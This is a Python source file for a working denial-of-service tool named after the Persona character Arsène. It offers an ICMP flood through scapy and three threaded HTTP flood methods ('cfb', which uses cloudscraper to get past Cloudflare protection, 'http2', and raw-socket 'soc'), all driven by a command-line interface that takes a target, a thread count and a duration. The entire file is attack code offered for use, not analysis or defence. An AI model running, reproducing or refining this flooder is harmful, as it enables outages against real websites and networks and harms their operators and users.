from scapy.all import *
import time
import sys
import cloudscraper
import datetime
import threading
import random
import socks
import ssl
import httpx
import socket
from urllib.parse import urlparse
from colorama import Fore, init

# Initialize colorama
init(convert=True)

# User-agent list
ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile)"
]

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while (until - datetime.datetime.now()).total_seconds() > 0:
        sys.stdout.flush()
        sys.stdout.write("\r " + Fore.MAGENTA + "[*] " + Fore.WHITE + "Attack status => " + str(int((until - datetime.datetime.now()).total_seconds())) + " sec left ")
        time.sleep(1)
    sys.stdout.flush()
    sys.stdout.write("\r " + Fore.MAGENTA + "[*] " + Fore.WHITE + "Attack Done !                                   \n")

def arsene_dos_attack(target_ip, interface="eth0", packet_count=1000):
    arsene_sequence = (
        "I am thou, thou art I.\n"
        "With great power comes great responsibility, and I, Arsène, wield the power of Persona to strike you down.\n"
        "Thy network shall feel my wrath, for I am the storm that engulfs thee.\n"
        "With each packet, I assert my dominance, for thou art but a mere mortal to my digital might.\n"
        "I am the attacker, thou art the attacked. Together, we dance in the chaos of the network.\n"
        "Prepare thyself, for the assault begins now.\n"
    )

    print(arsene_sequence)
    time.sleep(2)  # Dramatic pause

    try:
        send(IP(dst=target_ip)/ICMP(), iface=interface, count=packet_count, verbose=0)
        print(f"\nAttack on {target_ip} completed with {packet_count} packets sent.")
    except KeyboardInterrupt:
        print("\nAttack interrupted by user.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")

def get_target(url):
    url = url.rstrip()
    parsed = urlparse(url)
    target = {
        'uri': parsed.path if parsed.path else "/",
        'host': parsed.hostname,
        'scheme': parsed.scheme,
        'port': parsed.port if parsed.port else ("443" if parsed.scheme == "https" else "80")
    }
    return target

def launch_cfb(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    threads = []

    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=attack_cfb, args=(url, until, scraper))
            thd.start()
            threads.append(thd)
        except Exception as e:
            print(f"Error starting thread: {e}")

    for thd in threads:
        thd.join()

def attack_cfb(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
        except Exception as e:
            print(f"Error in CFB attack: {e}")

def launch_http2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads = []

    for _ in range(int(th)):
        thd = threading.Thread(target=attack_http2, args=(url, until))
        thd.start()
        threads.append(thd)

    for thd in threads:
        thd.join()

def attack_http2(url, until_datetime):
    headers = {
        'User-Agent': random.choice(ua),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=headers)
        except Exception as e:
            print(f"Error in HTTP/2 attack: {e}")

def launch_soc(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))

    req = (
        f"GET {target['uri']} HTTP/1.1\r\n"
        f"Host: {target['host']}\r\n"
        f"User-Agent: {random.choice(ua)}\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
        "Connection: Keep-Alive\r\n\r\n"
    )

    threads = []
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=attack_soc, args=(target, until, req))
            thd.start()
            threads.append(thd)
        except Exception as e:
            print(f"Error starting thread: {e}")

    for thd in threads:
        thd.join()

def attack_soc(target, until_datetime, req):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
    except Exception as e:
        print(f"Connection error in SOC: {e}")
        return

    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(100):
                s.send(str.encode(req))
        except Exception as e:
            print(f"Error in SOC attack: {e}")
            s.close()
            break

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("Usage: python arsene_dos.py <method> <target> <threads> <time>")
        sys.exit(1)

    method = sys.argv[1].rstrip().lower()
    target = sys.argv[2].rstrip()
    threads = sys.argv[3].rstrip()
    duration = sys.argv[4].rstrip()

    timer = threading.Thread(target=countdown, args=(duration,))
    timer.start()

    if method == "cfb":
        launch_cfb(target, threads, duration)
    elif method == "http2":
        launch_http2(target, threads, duration)
    elif method == "soc":
        launch_soc(target, threads, duration)
    else:
        print("No method found.\nMethod: cfb, http2, soc")

    timer.join()
